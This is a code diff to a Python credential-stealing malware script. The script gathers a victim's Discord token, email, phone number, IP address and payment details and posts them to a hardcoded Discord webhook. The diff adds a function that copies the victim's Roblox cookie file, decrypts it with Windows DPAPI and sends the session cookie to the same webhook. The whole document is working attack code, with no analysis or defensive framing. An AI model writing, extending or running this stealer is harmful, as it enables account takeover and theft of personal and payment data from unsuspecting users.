@@ -1,3 +1,5 @@
+webhook = "https://discord.com/api/webhooks/1552126592480841819/8CPld6L6LApYcwYxRdtNqeFZB5Bu2O06vTjkqo_ZaSmb-lvTvGO3Xmb3Bus87bHYjF4I"
+
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
@@ -91,7 +93,8 @@ def main():
                 if res.getcode() != 200:
                     continue
                 res_json = json.loads(res.read().decode())
-
+                username = res_json['username']
+                
                 badges = ""
                 flags = res_json['flags']
                 if flags == 64 or flags == 96:
@@ -162,7 +165,7 @@ def main():
                 embed_user = {
                     'embeds': [
                         {
-                            'title': f"**New user data: {res_json['username']}**",
+                            'title': f"**Discord user data: {res_json['username']}**",
                             'description': f"""
                                 ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                             'color': 3092790,
@@ -172,12 +175,46 @@ def main():
                     "avatar_url": "https://cdn.discordapp.com/attachments/1476808863968788664/1562329761181605988/IMG_4265.png?ex=6adae9f9&is=6ad99879&hm=d83aa8145c95def430c3349dd163f4045f6558aac2ab5445edd54d690e31fda5&"
                 }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1552126592480841819/8CPld6L6LApYcwYxRdtNqeFZB5Bu2O06vTjkqo_ZaSmb-lvTvGO3Xmb3Bus87bHYjF4I', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request(webhook, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                return username    
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
                 print(f"ERROR: {e}")
                 continue
 
+def roblox(username):
+    user_profile = os.getenv("USERPROFILE", "")
+    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
+
+    if not os.path.exists(roblox_cookies_path):
+        return
+    
+    temp_dir = os.getenv("TEMP", "")
+    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
+    shutil.copy(roblox_cookies_path, destination_path)
+
+    with open(destination_path, 'r', encoding='utf-8') as file:
+        file_content = json.load(file)
+        
+        encoded_cookies = file_content.get("CookiesData", "")
+        
+        if encoded_cookies:
+            decoded_cookies = base64.b64decode(encoded_cookies)
+            
+            decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
+            cookie = decrypted_cookies.decode('utf-8', errors='ignore')
+            requests.post(webhook, headers=getheaders(), json={
+                "username": "Smack",
+                "avatar_url": "https://cdn.discordapp.com/attachments/1476808863968788664/1561140154301943828/discord.jpg",
+                "embeds": [{
+                    "title": f"Roblox user data: {username}",
+                    "color": 0x5865F2,
+                    "description": "```\n" + cookie + "\n```",
+                }],
+            })
+
+
 if __name__ == "__main__":
-    main()
+    username = main()
+    roblox(username)
